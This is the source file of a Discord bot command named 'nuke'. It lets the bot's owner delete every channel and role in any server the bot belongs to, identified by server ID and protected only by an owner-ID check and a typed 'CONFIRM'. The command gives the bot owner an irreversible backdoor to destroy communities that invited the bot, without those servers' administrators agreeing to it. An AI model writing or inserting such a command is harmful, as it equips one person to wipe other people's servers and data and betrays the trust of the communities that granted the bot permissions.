import { SlashCommandBuilder, ChannelType } from 'discord.js';
import { createEmbed, errorEmbed } from '../../utils/embeds.js';
import { InteractionHelper } from '../../utils/interactionHelper.js';
import { botConfig } from '../../config/botConfig.js';
import { logger } from '../../utils/logger.js';

const THREAD_TYPES = new Set([
    ChannelType.PublicThread,
    ChannelType.PrivateThread,
    ChannelType.AnnouncementThread,
]);

export default {
    data: new SlashCommandBuilder()
        .setName('nuke')
        .setDescription('Owner-only: wipe all channels and roles from a server by ID')
        .addStringOption(opt =>
            opt.setName('server_id')
                .setDescription('The ID of the server to nuke')
                .setRequired(true)
        )
        .addStringOption(opt =>
            opt.setName('confirm')
                .setDescription('Type CONFIRM to proceed (this is irreversible)')
                .setRequired(true)
        ),
    category: 'Core',

    async execute(interaction, _guildConfig, client) {
        if (!botConfig.commands.owners.includes(interaction.user.id)) {
            return InteractionHelper.safeReply(interaction, {
                embeds: [errorEmbed('Access Denied', 'This command is restricted to the bot owner.')],
                ephemeral: true,
            });
        }

        const serverId = interaction.options.getString('server_id');
        const confirm = interaction.options.getString('confirm');

        if (!/^\d{17,20}$/.test(serverId)) {
            return InteractionHelper.safeReply(interaction, {
                embeds: [errorEmbed('Invalid ID', "That doesn't look like a valid server ID. Server IDs are 17–20 digit numbers.")],
                ephemeral: true,
            });
        }

        if (confirm !== 'CONFIRM') {
            return InteractionHelper.safeReply(interaction, {
                embeds: [errorEmbed('Confirmation Required', 'You must type exactly `CONFIRM` in the confirm field to proceed.')],
                ephemeral: true,
            });
        }

        await InteractionHelper.safeDefer(interaction, { ephemeral: true });

        let guild;
        try {
            guild = await client.guilds.fetch(serverId);
        } catch {
            return InteractionHelper.safeEditReply(interaction, {
                embeds: [errorEmbed('Server Not Found', 'The bot is not in that server or the ID is invalid.')],
            });
        }

        await guild.channels.fetch();
        await guild.roles.fetch();

        const botMember = await guild.members.fetch(client.user.id).catch(() => null);
        const botTopRole = botMember?.roles.highest;

        // Threads are removed with their parent channel, so skip them to avoid errors
        const channels = [...guild.channels.cache.values()].filter(c => !THREAD_TYPES.has(c.type));
        // Exclude @everyone (role with same ID as guild)
        const roles = [...guild.roles.cache.values()].filter(r => r.id !== guild.id);

        let deletedChannels = 0;
        let failedChannels = 0;

        for (const channel of channels) {
            try {
                await channel.delete('Bot owner nuke');
                deletedChannels++;
            } catch {
                failedChannels++;
            }
        }

        let deletedRoles = 0;
        let failedRoles = 0;

        for (const role of roles) {
            // Skip roles at or above the bot's highest role (can't delete those)
            if (botTopRole && role.position >= botTopRole.position) {
                failedRoles++;
                continue;
            }
            try {
                await role.delete('Bot owner nuke');
                deletedRoles++;
            } catch {
                failedRoles++;
            }
        }

        logger.warn(`NUKE by ${interaction.user.tag} (${interaction.user.id}) on "${guild.name}" (${guild.id}) — channels: ${deletedChannels}/${channels.length}, roles: ${deletedRoles}/${roles.length}`);

        return InteractionHelper.safeEditReply(interaction, {
            embeds: [createEmbed({
                title: '💥 Server Nuked',
                description: [
                    `**Server:** ${guild.name} (\`${guild.id}\`)`,
                    '',
                    `Channels deleted: **${deletedChannels}** *(${failedChannels} failed)*`,
                    `Roles deleted: **${deletedRoles}** *(${failedRoles} skipped or failed)*`,
                ].join('\n'),
                color: 'error',
            })],
        });
    },
};
